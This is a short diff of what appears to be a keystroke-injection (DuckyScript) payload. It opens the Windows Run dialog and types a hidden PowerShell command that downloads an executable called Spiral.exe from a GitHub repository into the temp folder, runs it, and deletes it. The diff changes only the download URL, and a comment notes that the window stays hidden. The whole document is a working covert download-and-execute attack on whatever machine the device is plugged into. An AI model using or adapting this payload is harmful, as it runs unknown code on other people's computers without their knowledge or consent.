@@ -8,5 +8,5 @@ REM - The PowerShell window will be hidden during execution 👀
 
 GUI r
 DELAY 1
-STRING powershell -WindowStyle Hidden -Command "$tempFile = [System.IO.Path]::Combine($env:TEMP, 'Spiral.exe'); (New-Object System.Net.WebClient).DownloadFile('https://github.com/Aries-Heker/Python-Tk-spiral/raw/main/ScreenTakeoverEXE/Spiral.exe', $tempFile); Start-Process $tempFile; Remove-Item $tempFile -Force"
+STRING powershell -WindowStyle Hidden -Command "$tempFile = [System.IO.Path]::Combine($env:TEMP, 'Spiral.exe'); (New-Object System.Net.WebClient).DownloadFile('https://github.com/Aries-Heker/Screen-Takeover/raw/main/Screen%20Take%20Over%20EXE/Spiral.exe', $tempFile); Start-Process $tempFile; Remove-Item $tempFile -Force"
 ENTER
